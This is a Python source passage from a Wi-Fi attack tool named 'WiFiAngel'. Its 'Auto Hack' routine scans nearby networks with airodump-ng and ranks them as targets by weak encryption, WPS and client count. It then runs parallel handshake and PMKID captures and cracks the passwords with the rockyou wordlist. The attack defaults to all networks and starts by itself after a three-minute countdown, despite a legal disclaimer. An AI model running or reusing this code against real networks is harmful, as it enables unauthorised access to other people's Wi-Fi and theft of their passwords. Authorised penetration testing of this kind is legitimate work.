    def auto_hack(self):
        """Automated hacking of all detected networks"""
        try:
            # Legal disclaimer
            disclaimer = Panel(
                "[bold yellow]LEGAL DISCLAIMER[/]\n\n"
                "[white]This tool is for EDUCATIONAL AND TESTING PURPOSES ONLY.[/]\n\n"
                "[white]1. Only use Auto Hack on networks you own or have explicit permission to test.[/]\n"
                "[white]2. Unauthorized access to computer networks is illegal and punishable by law.[/]\n"
                "[white]3. You bear ALL legal responsibility for how you use this tool.[/]\n"
                "[white]4. The developer accepts no liability for misuse or damage caused by this tool.[/]\n\n"
                "[bold red]By continuing, you acknowledge that you understand and accept these terms.[/]\n"
                "[bold yellow]Press Ctrl+C at any time to abort and return to main menu.[/]",
                title="[warning]WARNING[/]",
                border_style=BORDER_STYLE,
                box=box.MINIMAL,
            )
            
            self.console.print(disclaimer)
            self.console.print("[bold yellow]Press Enter to continue or Ctrl+C to abort...[/]")
            
            # Add notification about the 3-minute timeout feature
            self.console.print("\n[bold cyan]INFO: After selecting networks, you will have a 3-minute confirmation period[/]")
            self.console.print("[bold cyan]before the attack begins automatically.[/]")
            
            # Wait for user confirmation
            try:
                input()
            except KeyboardInterrupt:
                self.console.print("[bold yellow]Auto Hack aborted by user.[/]")
                return
                
            self.console.print("[info]Starting Auto Hack...[/]")
            self.logger.info("Auto Hack mode initiated")
            
            # Create session directory with timestamp
            session_timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            session_dir = AUTO_HACK_SESSIONS_DIR / session_timestamp
            session_dir.mkdir(parents=True, exist_ok=True)
            self.logger.info(f"Session directory created at {session_dir}")
            
            # Session report file
            report_file = session_dir / "auto_hack_report.txt"
            with open(report_file, "w") as f:
                f.write(f"WiFiAngel Auto Hack Report\n")
                f.write(f"Session: {session_timestamp}\n")
                f.write(f"Start Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
            
            # Step 1: Enable monitor mode if not already enabled (same path as main menu / WiFiAdapterManager)
            self.console.print("[bold blue]1. Enabling Monitor Mode...[/]")
            try:
                mon = self.wifi_adapter.find_monitor_interface()
                cur_iface_type = self.wifi_adapter.get_interface_type(self.interface_name)
                if cur_iface_type == "monitor":
                    self.console.print(f"[success]Already in monitor mode: {self.interface_name}[/]")
                    self.logger.info(f"Already in monitor mode: {self.interface_name}")
                elif mon:
                    self.interface_name = mon
                    self.console.print(f"[success]Using monitor interface: {self.interface_name}[/]")
                    self.logger.info(f"Using monitor interface: {self.interface_name}")
                else:
                    base = managed_name_from_monitor(self.interface_name)
                    self.interface_name = self.wifi_adapter.start_monitor_mode(base)
                    self.console.print(f"[success]Monitor mode enabled on {self.interface_name}[/]")
                    self.logger.info(f"Monitor mode enabled on {self.interface_name}")
                    time.sleep(2)
                with open(report_file, "a") as f:
                    f.write(f"Interface: {self.interface_name} (Monitor Mode)\n")
            except Exception as e:
                self.logger.error(f"Auto Hack monitor mode failed: {e}")
                self.console.print(f"[bold red]Could not enable monitor mode: {e}[/]")
                return
            
            # Step 2: airodump-ng discovery (same backend as "Start or stop network scan"; no Live table)
            self.console.print(
                "[bold blue]2. Network discovery via airodump-ng (60 seconds, same as menu scan)...[/]"
            )
            if not hasattr(self, "_networks_lock"):
                self._networks_lock = threading.Lock()
            with self._networks_lock:
                self.networks.clear()
            self.scanning = True
            scan_thread = threading.Thread(
                target=lambda: self.scan_networks(live_table=False),
                daemon=True,
            )
            scan_thread.start()
            
            scan_time = 60  # 60 seconds scan time
            scan_start_time = time.time()

            def _auto_hack_scan_panel(remaining_sec: int) -> Panel:
                done = scan_time - remaining_sec
                progress_percent = min(100, int(done / scan_time * 100))
                filled = min(20, progress_percent // 5)
                bar_gfx = "█" * filled + "░" * (20 - filled)
                network_count = len(self.networks)
                clients_count = sum(len(n["clients"]) for n in self.networks.values())
                minutes = remaining_sec // 60
                seconds = remaining_sec % 60
                return Panel(
                    Group(
                        Text(bar_gfx, style="cyan"),
                        Text.assemble(
                            ("  ", ""),
                            (f"{progress_percent}%", "bold cyan"),
                            ("   networks ", "dim"),
                            (str(network_count), "green bold"),
                            ("   clients ", "dim"),
                            (str(clients_count), "yellow bold"),
                            ("   time left ", "dim"),
                            (f"{minutes:02d}:{seconds:02d}", "bold white"),
                        ),
                    ),
                    title="[bold]Step 2 · Airodump-ng discovery[/]",
                    subtitle="[dim]60s passive scan (same as main menu)[/]",
                    border_style=BORDER_STYLE,
                    box=box.ROUNDED,
                    padding=(0, 1),
                )

            # Rich Console does not reliably update a single line via carriage return; use Live in place
            with Live(
                _auto_hack_scan_panel(scan_time),
                console=self.console,
                refresh_per_second=10,
                transient=True,
            ) as scan_live:
                for remaining_time in range(scan_time, 0, -1):
                    scan_live.update(_auto_hack_scan_panel(remaining_time))
                    time.sleep(1)
            
            # Scan is completed
            scan_duration = time.time() - scan_start_time
            self.scanning = False
            time.sleep(1)
            
            # Display scan results
            network_count = len(self.networks)
            clients_count = sum(len(network['clients']) for network in self.networks.values())
            
            self.console.print(f"[success]Scan completed. Found {network_count} networks and {clients_count} clients.[/]")
            
            # Display networks table
            if network_count > 0:
                networks_table = Table(show_header=True, header_style="bold blue", box=box.MINIMAL, border_style=BORDER_STYLE, title="[bold green]Discovered Networks[/]")
                networks_table.add_column("SSID", style="cyan")
                networks_table.add_column("BSSID", style="green")
                networks_table.add_column("Channel", style="blue", justify="center")
                networks_table.add_column("Security", style="yellow")
                networks_table.add_column("Signal", style="magenta", justify="center")
                networks_table.add_column("Clients", style="red", justify="center")
                
                # Sort networks by signal strength
                sorted_networks = sorted(self.networks.items(), key=lambda x: x[1]['signal'], reverse=True)
                
                for bssid, network in sorted_networks:
                    networks_table.add_row(
                        network['ssid'],
                        bssid,
                        str(network['channel']),
                        network['cipher'],
                        str(network['signal']),
                        str(len(network['clients']))
                    )
                
                self.console.print(networks_table)
            
            self.logger.info(f"Network scan completed in {scan_duration:.2f} seconds")
            self.logger.info(f"Found {len(self.networks)} networks")
            
            with open(report_file, "a") as f:
                f.write(f"Scan Duration: {scan_duration:.2f} seconds\n")
                f.write(f"Total Networks Found: {len(self.networks)}\n\n")
                f.write("Network Details:\n")
                for bssid, network in self.networks.items():
                    f.write(f"- {network['ssid']} ({bssid}):\n")
                    f.write(f"  Channel: {network['channel']}\n")
                    f.write(f"  Security: {network['cipher']}\n")
                    f.write(f"  Signal: {network['signal']}\n")
                    f.write(f"  Clients: {len(network['clients'])}\n")
                    if network['clients']:
                        f.write(f"  Client MACs: {', '.join(network['clients'])}\n")
                    f.write("\n")
            
            if not self.networks:
                self.console.print("[error]No networks found. Check your WiFi adapter.[/]")
                self.logger.error("No networks found during scan")
                with open(report_file, "a") as f:
                    f.write("ERROR: No networks found during scan\n")
                return
            
            # Target prioritization algorithm
            self.console.print("[bold blue]3. Prioritizing Target Networks...[/]")
            
            # Calculate target score for each network
            scored_networks = []
            for bssid, network in self.networks.items():
                score = 0
                
                # Factors that increase priority
                client_count = len(network['clients'])
                score += client_count * 20  # Heavy weight for active clients
                
                # Signal strength (better signal = higher priority)
                signal_strength = abs(network['signal'])
                if signal_strength < 60:  # Good signal
                    score += 15
                elif signal_strength < 70:  # Medium signal
                    score += 10
                else:  # Poor signal
                    score += 5
                    
                # Security factors (certain security types might be more interesting)
                if "WEP" in network['cipher']:
                    score += 30  # WEP is easy to crack
                elif "WPA" in network['cipher'] and "WPA2" not in network['cipher']:
                    score += 20  # Original WPA has vulnerabilities
                elif "WPA2" in network['cipher']:
                    score += 15  # Standard security
                elif "WPA3" in network['cipher']:
                    score += 25  # Interesting for testing WPA3 security
                
                # Presence of WPS
                if network.get('wps', False):
                    score += 20  # WPS can be vulnerable
                
                # Add to scored networks list
                scored_networks.append((bssid, network, score))
            
            # Sort networks by score (highest first)
            scored_networks.sort(key=lambda x: x[2], reverse=True)
            
            # Display prioritized networks
            priority_table = Table(show_header=True, header_style="bold magenta", box=box.MINIMAL, border_style=BORDER_STYLE, title="[bold blue]Target Networks (Prioritized)[/]")
            priority_table.add_column("Priority", style="cyan", justify="center")
            priority_table.add_column("Network", style="green")
            priority_table.add_column("Score", style="yellow", justify="center")
            priority_table.add_column("Clients", style="blue", justify="center")
            priority_table.add_column("Security", style="magenta")
            
            # Display the top networks for selection (up to 20)
            display_networks = min(20, len(scored_networks))
            for i, (bssid, network, score) in enumerate(scored_networks[:display_networks], 1):
                priority_table.add_row(
                    str(i),
                    f"{network['ssid']} ({bssid})",
                    str(score),
                    str(len(network['clients'])),
                    network['cipher']
                )
            
            self.console.print(priority_table)
            
            # Allow user to select specific networks to attack
            self.console.print("\n[bold blue]Network Selection[/]")
            self.console.print("[bold yellow]You can select specific networks to attack or attack all networks.[/]")
            self.console.print("[bold cyan]Enter network numbers separated by commas (e.g. 1,3,5) or 'all' for all networks.[/]")
            
            # Get user selection
            selected_networks_input = Prompt.ask("[bold green]Select networks to attack", default="all")
            
            # Process user selection
            selected_indices = []
            if selected_networks_input.lower() != "all":
                try:
                    # Parse the input and get valid indices
                    input_indices = [int(idx.strip()) for idx in selected_networks_input.split(",") if idx.strip()]
                    selected_indices = [idx for idx in input_indices if 1 <= idx <= display_networks]
                    
                    if not selected_indices:
                        self.console.print("[bold yellow]No valid networks selected. Using all networks instead.[/]")
                        selected_indices = list(range(1, display_networks + 1))
                    else:
                        self.console.print(f"[bold green]Selected {len(selected_indices)} networks for attack.[/]")
                except ValueError:
                    self.console.print("[bold yellow]Invalid input. Using all networks instead.[/]")
                    selected_indices = list(range(1, display_networks + 1))
            else:
                self.console.print("[bold green]Selected all networks for attack.[/]")
                selected_indices = list(range(1, display_networks + 1))
            
            # Add a 3-minute timeout confirmation
            self.console.print("\n[warning]You have 3 minutes to confirm your selection.[/]")
            self.console.print("[bold cyan]Press Enter to continue immediately or Ctrl+C to abort.[/]")
            self.console.print("[bold red]Attack will automatically start after 3 minutes if no action is taken.[/]")
            
            # Setup the timeout using a countdown display
            start_time = time.time()
            timeout = 180  # 3 minutes in seconds
            
            try:
                # Create a timer display
                with Live(refresh_per_second=1) as live:
                    while True:
                        elapsed = time.time() - start_time
                        remaining = timeout - elapsed
                        
                        if remaining <= 0:
                            # Timeout reached, proceed with attack
                            live.update(Panel(f"[bold green]Timeout reached. Starting attack...[/]", border_style=BORDER_STYLE, box=box.MINIMAL))
                            time.sleep(1)
                            break
                        
                        # Check if there's input available (Enter key pressed)
                        if select.select([sys.stdin], [], [], 0)[0]:
                            # Clear the input buffer
                            sys.stdin.readline()
                            live.update(Panel(f"[bold green]Continuing with attack...[/]", border_style=BORDER_STYLE, box=box.MINIMAL))
                            time.sleep(1)
                            break
                        
                        # Update the display with remaining time
                        minutes = int(remaining // 60)
                        seconds = int(remaining % 60)
                        live.update(Panel(
                            f"[bold yellow]Auto-start in: [bold red]{minutes:02d}:{seconds:02d}[/]\n\n"
                            f"[bold cyan]Press Enter to continue now[/]\n"
                            f"[bold cyan]Press Ctrl+C to abort[/]",
                            border_style=BORDER_STYLE,
                            box=box.MINIMAL,
                        ))
                        
                        # Short sleep to prevent high CPU usage
                        time.sleep(0.1)
            except KeyboardInterrupt:
                self.console.print("\n[warning]Auto Hack aborted by user.[/]")
                self.logger.warning("Auto Hack aborted by user during timeout confirmation")
                self._auto_hack_cleanup()
                return
            
            # Log prioritization information
            self.logger.info(f"Target networks prioritized: {len(scored_networks)} networks ranked")
            self.logger.info(f"User selected {len(selected_indices)} networks for attack")
            
            with open(report_file, "a") as f:
                f.write("Prioritized Targets:\n")
                for i, (bssid, network, score) in enumerate(scored_networks, 1):
                    selected_mark = " [SELECTED]" if i in selected_indices else ""
                    f.write(f"{i}. {network['ssid']} ({bssid}) - Score: {score}{selected_mark}\n")
                f.write("\n")

            # Filter networks with clients and validate data
            networks_with_clients = []
            for i, (bssid, network, score) in enumerate(scored_networks, 1):
                # Skip if not in selected indices
                if i not in selected_indices and selected_indices:
                    continue
                    
                try:
                    if not isinstance(network, dict):
                        self.logger.warning(f"Invalid network data for {bssid}: not a dictionary")
                        continue

                    # Create a validated copy of network data
                    validated_network = {}
                    
                    # SSID validation
                    try:
                        validated_network['ssid'] = str(network.get('ssid', 'Unknown'))
                    except Exception:
                        validated_network['ssid'] = 'Unknown'
                    
                    # Channel validation
                    try:
                        validated_network['channel'] = int(network.get('channel', 1))
                    except (TypeError, ValueError):
                        validated_network['channel'] = 1
                    
                    # Cipher validation
                    try:
                        validated_network['cipher'] = str(network.get('cipher', 'Unknown'))
                    except Exception:
                        validated_network['cipher'] = 'Unknown'
                    
                    # Clients validation
                    try:
                        clients = network.get('clients', set())
                        if not isinstance(clients, set):
                            clients = set(clients) if clients else set()
                        validated_network['clients'] = clients
                    except Exception:
                        validated_network['clients'] = set()
                    
                    # Signal validation
                    try:
                        validated_network['signal'] = int(network.get('signal', 0))
                    except (TypeError, ValueError):
                        validated_network['signal'] = 0
                    
                    # Only include networks with clients
                    if validated_network['clients']:
                        networks_with_clients.append((bssid, validated_network))
                        self.logger.debug(f"Validated network data for {validated_network['ssid']} ({bssid})")
                    else:
                        self.logger.debug(f"Skipping network {validated_network['ssid']} ({bssid}): no clients")
                        
                except Exception as e:
                    self.logger.error(f"Error validating network {bssid}: {str(e)}")
                    continue
            
            if not networks_with_clients:
                self.console.print("[error]No networks with connected clients. Attack requires active clients.[/]")
                self.logger.error("No networks with connected clients")
                with open(report_file, "a") as f:
                    f.write("ERROR: No networks with connected clients found\n")
                self._auto_hack_cleanup()
                return
            
            self.console.print(f"[bold green]Found {len(networks_with_clients)} networks with active clients.[/]")
            self.logger.info(f"Found {len(networks_with_clients)} networks with active clients")
            
            # Log validated networks
            with open(report_file, "a") as f:
                f.write("\nValidated Networks:\n")
                for bssid, network in networks_with_clients:
                    f.write(f"- {network['ssid']} ({bssid}):\n")
                    f.write(f"  Channel: {network['channel']}\n")
                    f.write(f"  Security: {network['cipher']}\n")
                    f.write(f"  Clients: {len(network['clients'])}\n")
                    f.write(f"  Signal: {network['signal']}\n\n")
                
            # Create results table
            results_table = Table(show_header=True, header_style="bold magenta", box=box.MINIMAL, border_style=BORDER_STYLE, title="[bold blue]Attack Results[/]")
            results_table.add_column("Network", style="cyan")
            results_table.add_column("Status", style="yellow", width=40)
            results_table.add_column("Handshake", style="green")
            results_table.add_column("PMKID", style="blue")
            results_table.add_column("Password", style="magenta")
            
            # Check for wordlist
            wordlist = str(DEFAULT_WORDLIST)
            if not os.path.exists(wordlist):
                wordlist_alt = str(ROCKYOU_WORDLIST)
                if os.path.exists(wordlist_alt):
                    wordlist = wordlist_alt
                    self.console.print(
                        f"[warning]Default wordlist not found, using {wordlist_alt} instead.[/]"
                    )
                    self.logger.warning(f"Default wordlist not found, using {wordlist_alt} instead")
                else:
                    self.console.print(f"[error]No default wordlists found.[/]")
                    wordlist = Prompt.ask("[bold yellow]Please enter the path to a wordlist file (or press Enter to skip)")
                    if not wordlist or not os.path.exists(wordlist):
                        self.console.print("[error]No valid wordlist. Exiting auto hack.[/]")
                        self.logger.error("No valid wordlist provided, exiting auto hack")
                        self._auto_hack_cleanup()
                        return
                
            # Parallel processing settings
            max_parallel_attacks = min(4, len(networks_with_clients))  # Up to 4 parallel attacks
            self.console.print(f"[bold blue]4. Starting Parallel Attacks on {len(networks_with_clients)} networks (max {max_parallel_attacks} at once)...[/]")
            
            # Process networks in parallel; rich Progress only advanced on completion, so long
            # captures looked "stuck" at 0%. Use Live + worker heartbeats instead.
            attack_results: list = []
            attack_progress = {"lock": threading.Lock(), "active": {}}
            total_nets = len(networks_with_clients)

            def _render_step4_live() -> Panel:
                finished = len(attack_results)
                rows: list = []
                with attack_progress["lock"]:
                    for _bid, st in sorted(
                        attack_progress["active"].items(),
                        key=lambda x: x[1]["ssid"].lower(),
                    ):
                        rows.append(
                            Text.assemble(
                                ("  * ", "dim"),
                                (st["ssid"], "bold cyan"),
                                ("  ", ""),
                                (st["detail"], ""),
                                ("  ", "dim"),
                                (f"{st['elapsed']}s", "yellow"),
                            )
                        )
                parts = [
                    Text.assemble(
                        ("Finished ", "bold"),
                        (f"{finished}/{total_nets}", "green bold"),
                        ("  ", ""),
                        ("|  ", "dim"),
                        (
                            "Each network capture typically runs ~3-5 minutes before this step advances.",
                            "dim",
                        ),
                    )
                ]
                if rows:
                    parts.append(Group(*rows))
                else:
                    parts.append(Text("  Starting workers...", style="dim"))
                return Panel(
                    Group(*parts),
                    title="[bold]Step 4 · Parallel attacks[/]",
                    subtitle="[dim]Live status from capture loop (not stuck at 0%)[/]",
                    border_style=BORDER_STYLE,
                    box=box.ROUNDED,
                    padding=(0, 1),
                )

            executor = ThreadPoolExecutor(max_workers=max_parallel_attacks)
            future_to_network = {}
            try:
                for bssid, validated_net in networks_with_clients:
                    future = executor.submit(
                        self._auto_hack_single_network,
                        bssid,
                        validated_net,
                        session_dir,
                        wordlist,
                        attack_progress,
                    )
                    future_to_network[future] = (bssid, validated_net)

                pending = set(future_to_network.keys())
                with Live(
                    _render_step4_live(),
                    console=self.console,
                    refresh_per_second=4,
                    transient=True,
                ) as live:
                    while pending:
                        done, pending = concurrent.futures.wait(
                            pending,
                            timeout=0.25,
                            return_when=concurrent.futures.FIRST_COMPLETED,
                        )
                        for future in done:
                            bssid, network = future_to_network[future]
                            try:
                                result = future.result()
                                attack_results.append((bssid, network, result))

                                results_table.add_row(
                                    network["ssid"],
                                    result["status_message"],
                                    result["handshake_status"],
                                    result["pmkid_status"],
                                    result["password"] if result["password"] else "",
                                )
                            except Exception as e:
                                self.logger.error(
                                    f"Error during auto hack of {network['ssid']}: {str(e)}"
                                )
                                result = {
                                    "status_message": f"[error]Error: {str(e)}[/]",
                                    "handshake_status": "[red]Failed",
                                    "pmkid_status": "[red]Failed",
                                    "password": None,
                                    "handshake_file": None,
                                    "pmkid_file": None,
                                }
                                attack_results.append((bssid, network, result))
                                results_table.add_row(
                                    network["ssid"],
                                    result["status_message"],
                                    result["handshake_status"],
                                    result["pmkid_status"],
                                    "",
                                )
                        live.update(_render_step4_live())

            except KeyboardInterrupt:
                self.console.print("\n[warning]Auto Hack stopped by user.[/]")
                self.logger.warning("Auto Hack stopped by user")
                for future in future_to_network:
                    future.cancel()
                executor.shutdown(wait=False, cancel_futures=True)
                self.scanning = False
                self._auto_hack_cleanup()
                self.current_menu = "main"
                return
            finally:
                executor.shutdown(wait=False, cancel_futures=True)
            
            # Display final results
            self.console.print("\n")
            self.console.print(results_table)
            
            # Analyze results
            handshakes_captured = sum(1 for _, _, result in attack_results if "[green]Captured" in result['handshake_status'])
            pmkids_captured = sum(1 for _, _, result in attack_results if "[green]Captured" in result['pmkid_status'])
            passwords_found = sum(1 for _, _, result in attack_results if result['password'])
            
            # Generate comprehensive analysis and recommendations
            self.console.print("\n[bold blue]5. Attack Result Analysis[/]")
            analysis_table = Table(show_header=True, header_style="bold blue", box=box.MINIMAL, border_style=BORDER_STYLE, title="[bold green]Analysis Summary[/]")
            analysis_table.add_column("Metric", style="cyan")
            analysis_table.add_column("Value", style="yellow")
            analysis_table.add_column("Success Rate", style="green")
            
            total_networks = len(networks_with_clients)
            analysis_table.add_row(
                "Networks Attacked", 
                str(total_networks),
                "100%"
            )
            analysis_table.add_row(
                "Handshakes Captured", 
                str(handshakes_captured),
                f"{handshakes_captured/total_networks*100:.1f}%" if total_networks > 0 else "0%"
            )
            analysis_table.add_row(
                "PMKIDs Captured", 
                str(pmkids_captured),
                f"{pmkids_captured/total_networks*100:.1f}%" if total_networks > 0 else "0%"
            )
            analysis_table.add_row(
                "Passwords Cracked", 
                str(passwords_found),
                f"{passwords_found/total_networks*100:.1f}%" if total_networks > 0 else "0%"
            )
            
            self.console.print(analysis_table)
            
            # Generate security recommendations
            security_panel = Panel(
                "[yellow]Network Security Analysis[/]\n\n" +
                (f"[success]Cracked {passwords_found} passwords out of {total_networks} networks.[/]\n\n" if passwords_found > 0 else "[error]No passwords were cracked.[/]\n\n") +
                "[yellow]Security Recommendations:[/]\n" +
                "- [cyan]Use WPA3 encryption when available for better security.[/]\n" +
                "- [cyan]Use complex, randomly generated passwords (20+ characters).[/]\n" +
                "- [cyan]Use unique passwords for each network.[/]\n" +
                "- [cyan]Disable WPS as it can be vulnerable to attacks.[/]\n" +
                "- [cyan]Consider implementing MAC address filtering as an extra layer.[/]\n" +
                "- [cyan]Enable network logging to detect attack attempts.[/]\n\n" +
                "[yellow]Security Statistics:[/]\n" +
                f"- [cyan]Networks with vulnerable security (WEP/WPA): {sum(1 for _, network, _ in attack_results if 'WEP' in network['cipher'] or ('WPA' in network['cipher'] and 'WPA2' not in network['cipher'] and 'WPA3' not in network['cipher']))}/{total_networks}[/]\n" +
                f"- [cyan]Networks with recommended security (WPA3): {sum(1 for _, network, _ in attack_results if 'WPA3' in network['cipher'])}/{total_networks}[/]\n",
                title="[bold magenta]Security Analysis & Recommendations[/]",
                border_style=BORDER_STYLE,
                box=box.MINIMAL,
            )
            
            self.console.print(security_panel)
        
            # Save comprehensive report
            end_time = datetime.now()
            self.logger.info(f"Auto Hack completed at {end_time}")
            with open(report_file, "a") as f:
                f.write(f"End Time: {end_time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Total Duration: {(end_time - datetime.strptime(session_timestamp, '%Y%m%d_%H%M%S')).total_seconds():.2f} seconds\n\n")
                f.write("==================\n")
                f.write("SUMMARY RESULTS\n")
                f.write("==================\n")
                f.write(f"Networks Attacked: {total_networks}\n")
                f.write(f"Handshakes Captured: {handshakes_captured}\n")
                f.write(f"PMKIDs Captured: {pmkids_captured}\n")
                f.write(f"Passwords Cracked: {passwords_found}\n\n")
                
                # Write security analysis
                f.write("==================\n")
                f.write("SECURITY ANALYSIS\n")
                f.write("==================\n")
                f.write(f"Networks with vulnerable security (WEP/WPA): {sum(1 for _, network, _ in attack_results if 'WEP' in network['cipher'] or ('WPA' in network['cipher'] and 'WPA2' not in network['cipher'] and 'WPA3' not in network['cipher']))}/{total_networks}\n")
                f.write(f"Networks with recommended security (WPA3): {sum(1 for _, network, _ in attack_results if 'WPA3' in network['cipher'])}/{total_networks}\n\n")
                
                # Write recommendations
                f.write("==================\n")
                f.write("RECOMMENDATIONS\n")
                f.write("==================\n")
                f.write("Security Recommendations:\n")
                f.write("- Use WPA3 encryption when available for better security.\n")
                f.write("- Use complex, randomly generated passwords (20+ characters).\n")
                f.write("- Use unique passwords for each network.\n")
                f.write("- Disable WPS as it can be vulnerable to attacks.\n")
                f.write("- Consider implementing MAC address filtering as an extra layer.\n")
                f.write("- Enable network logging to detect attack attempts.\n\n")
                
                # Write follow-up steps
                f.write("==================\n")
                f.write("FOLLOW-UP STEPS\n")
                f.write("==================\n")
                if passwords_found > 0:
                    f.write("- The discovered passwords should be disclosed to network owners for security improvement.\n")
                    f.write("- Networks with cracked passwords should update their security configurations immediately.\n")
                if handshakes_captured > 0 and passwords_found < handshakes_captured:
                    f.write("- Additional cracking attempts with larger dictionaries can be performed offline.\n")
                    f.write("- Consider using more powerful hardware for offline cracking.\n")
                f.write("- Regular security audits should be performed to ensure continued network safety.\n")
            
            # Create an HTML report with more details and visual elements
            html_report_file = session_dir / "auto_hack_report.html"
            self._generate_html_report(session_dir, attack_results, html_report_file)
                
            self.console.print("\n[success]Auto Hack completed. Detailed reports saved to:[/]")
            self.console.print(f"[bold cyan]  - Text Report: {report_file}[/]")
            self.console.print(f"[bold cyan]  - HTML Report: {html_report_file}[/]")
            
        except KeyboardInterrupt:
            self.console.print("\n[warning]Auto Hack stopped by user.[/]")
            self.logger.warning("Auto Hack stopped by user")
            self.scanning = False
            self._auto_hack_cleanup()
            self.current_menu = "main"
            return
        except Exception as e:
            self.console.print(f"[error]Error during Auto Hack: {str(e)}[/]")
            self.logger.error(f"Error during Auto Hack: {str(e)}")
            with open(report_file, "a") as f:
                f.write(f"\nERROR: {str(e)}\n")
            self.scanning = False
        finally:
            # Execute safe cleanup
            self.console.print("[bold blue]Performing cleanup...[/]")
            self._auto_hack_cleanup()
            self.current_menu = "main"
            return
    
    def _generate_html_report(self, session_dir, attack_results, html_report_file):
        """Generate an HTML report with attack results"""
        try:
            # Calculate statistics
            total_networks = len(attack_results)
            handshakes_captured = sum(1 for _, _, result in attack_results if "[green]Captured" in result['handshake_status'])
            pmkids_captured = sum(1 for _, _, result in attack_results if "[green]Captured" in result['pmkid_status'])
            passwords_found = sum(1 for _, _, result in attack_results if result['password'])
            vulnerable_networks = sum(1 for _, network, _ in attack_results if 'WEP' in network['cipher'] or ('WPA' in network['cipher'] and 'WPA2' not in network['cipher'] and 'WPA3' not in network['cipher']))
            wpa3_networks = sum(1 for _, network, _ in attack_results if 'WPA3' in network['cipher'])
            
            # Generate table rows for attack results
            attack_results_rows = ""
            for bssid, network, result in attack_results:
                handshake_status = "Captured" if "[green]Captured" in result['handshake_status'] else "Failed"
                handshake_class = "success" if "[green]Captured" in result['handshake_status'] else "error"
                
                pmkid_status = "Captured" if "[green]Captured" in result['pmkid_status'] else "Failed"
                pmkid_class = "success" if "[green]Captured" in result['pmkid_status'] else "error"
                
                password = result['password'] if result['password'] else "Not found"
                password_class = "success" if result['password'] else "warning"
                
                attack_results_rows += f"""<tr>
            <td>{network['ssid']}</td>
            <td>{bssid}</td>
            <td>{network['cipher']}</td>
            <td class="{handshake_class}">{handshake_status}</td>
            <td class="{pmkid_class}">{pmkid_status}</td>
            <td class="{password_class}">{password}</td>
        </tr>"""
            
            # Generate follow-up steps based on results
            followup_steps = ""
            if passwords_found > 0:
                followup_steps += "<li>The discovered passwords should be disclosed to network owners for security improvement.</li>"
                followup_steps += "<li>Networks with cracked passwords should update their security configurations immediately.</li>"
            if handshakes_captured > 0 and passwords_found < handshakes_captured:
                followup_steps += "<li>Additional cracking attempts with larger dictionaries can be performed offline.</li>"
                followup_steps += "<li>Consider using more powerful hardware for offline cracking.</li>"
            followup_steps += "<li>Regular security audits should be performed to ensure continued network safety.</li>"
            
            # Fill in template variables
            now = datetime.now()
            session_start_time = datetime.strptime(session_dir.name.split("/")[-1], "%Y%m%d_%H%M%S")
            duration = (now - session_start_time).total_seconds()
            
            # Create simplified HTML with inline CSS
            html_content = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WiFiAngel Auto Hack Report</title>
    <style>
        body {{ font-family: Arial, sans-serif; line-height: 1.6; color: #333; max-width: 1200px; margin: 0 auto; padding: 20px; }}
        h1, h2, h3 {{ color: #2c3e50; }}
        h1 {{ border-bottom: 2px solid #3498db; padding-bottom: 10px; }}
        table {{ border-collapse: collapse; width: 100%; margin: 20px 0; }}
        th, td {{ padding: 12px 15px; border: 1px solid #ddd; text-align: left; }}
        th {{ background-color: #3498db; color: white; }}
        tr:nth-child(even) {{ background-color: #f2f2f2; }}
        .success {{ color: #27ae60; font-weight: bold; }}
        .warning {{ color: #f39c12; font-weight: bold; }}
        .error {{ color: #e74c3c; font-weight: bold; }}
        .summary-box {{ background-color: #ecf0f1; border-left: 5px solid #3498db; padding: 15px; margin: 20px 0; }}
        .recommendations {{ background-color: #e8f4fd; border-left: 5px solid #2980b9; padding: 15px; margin: 20px 0; }}
        .chart-container {{ max-width: 600px; margin: 20px auto; }}
    </style>
</head>
<body>
    <h1>WiFiAngel Auto Hack Report</h1>
    <div class="summary-box">
        <h2>Session Summary</h2>
        <p><strong>Date:</strong> {now.strftime("%Y-%m-%d")}</p>
        <p><strong>Start Time:</strong> {session_start_time.strftime("%Y-%m-%d %H:%M:%S")}</p>
        <p><strong>End Time:</strong> {now.strftime("%Y-%m-%d %H:%M:%S")}</p>
        <p><strong>Duration:</strong> {duration:.2f} seconds</p>
        <p><strong>Networks Scanned:</strong> {len(self.networks)}</p>
        <p><strong>Networks Attacked:</strong> {total_networks}</p>
    </div>
    
    <h2>Attack Results</h2>
    <table>
        <tr>
            <th>Network</th>
            <th>BSSID</th>
            <th>Security</th>
            <th>Handshake</th>
            <th>PMKID</th>
            <th>Password</th>
        </tr>
        {attack_results_rows}
    </table>
    
    <h2>Statistics</h2>
    <div class="summary-box">
        <p><strong>Handshakes Captured:</strong> {handshakes_captured} / {total_networks} ({(handshakes_captured/total_networks*100) if total_networks > 0 else 0:.1f}%)</p>
        <p><strong>PMKIDs Captured:</strong> {pmkids_captured} / {total_networks} ({(pmkids_captured/total_networks*100) if total_networks > 0 else 0:.1f}%)</p>
        <p><strong>Passwords Cracked:</strong> {passwords_found} / {total_networks} ({(passwords_found/total_networks*100) if total_networks > 0 else 0:.1f}%)</p>
    </div>
    
    <h2>Security Analysis</h2>
    <div class="summary-box">
        <p><strong>Networks with vulnerable security (WEP/WPA):</strong> {vulnerable_networks} / {total_networks}</p>
        <p><strong>Networks with recommended security (WPA3):</strong> {wpa3_networks} / {total_networks}</p>
    </div>
    
    <h2>Recommendations</h2>
    <div class="recommendations">
        <ul>
            <li>Use WPA3 encryption when available for better security.</li>
            <li>Use complex, randomly generated passwords (20+ characters).</li>
            <li>Use unique passwords for each network.</li>
            <li>Disable WPS as it can be vulnerable to attacks.</li>
            <li>Consider implementing MAC address filtering as an extra layer.</li>
            <li>Enable network logging to detect attack attempts.</li>
        </ul>
    </div>
    
    <h2>Follow-up Steps</h2>
    <div class="recommendations">
        <ul>
            {followup_steps}
        </ul>
    </div>
    
    <footer>
        <p>Generated by WiFiAngel on {now.strftime("%Y-%m-%d")}</p>
    </footer>
</body>
</html>"""
            
            # Write HTML content to file
            with open(html_report_file, "w") as f:
                f.write(html_content)
                
            self.logger.info(f"HTML report generated at {html_report_file}")
            
        except Exception as e:
            self.logger.error(f"Error generating HTML report: {str(e)}")
            # Continue execution, don't let report generation failure stop the program

    def cleanup_and_exit(self):
        """Performs cleanup before exiting"""
        self.scanning = False
